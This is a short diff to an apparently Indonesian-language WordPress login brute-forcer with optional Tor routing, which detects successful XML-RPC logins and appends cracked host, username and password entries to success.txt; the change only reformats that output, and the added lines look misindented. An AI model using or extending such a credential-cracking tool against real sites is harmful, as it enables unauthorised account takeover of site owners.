@@ -284,7 +284,11 @@ def run_bruteforce(url, use_tor, target_usernames, xmlrpc_status):
                             if "isAdmin" in response or "blogid" in response:
                                 print(colored(f"[+] Berhasil: {username}:{pwd}", 'green'))
                                 with open("success.txt", "a") as out:
-                                    out.write(f"host:{url}\nusername:{username}\npassword:{pwd}\n\n")
+                                           out.write("-" * 60 + "\n")
+                                           out.write(f"host     : {url}\n")
+                                           out.write(f"username : {username}\n")
+                                           out.write(f"password : {pwd}\n")
+                                           out.write("-" * 60 + "\n\n")
                                 success_flag = True
                                 break
                         if success_flag: break
@@ -346,7 +350,11 @@ def run_bruteforce(url, use_tor, target_usernames, xmlrpc_status):
                                 with lock:
                                     print(colored(f"[+] Berhasil: {username}:{pwd}", 'green'))
                                     with open("success.txt", "a") as out:
-                                        out.write(f"host:{url}\nusername:{username}\npassword:{pwd}\n\n")
+                                            out.write("-" * 60 + "\n")
+                                            out.write(f"host     : {url}\n")
+                                            out.write(f"username : {username}\n")
+                                            out.write(f"password : {pwd}\n")
+                                            out.write("-" * 60 + "\n\n")
                                     stop_event.set()
                                     nonlocal success_flag; success_flag = True
                         else:
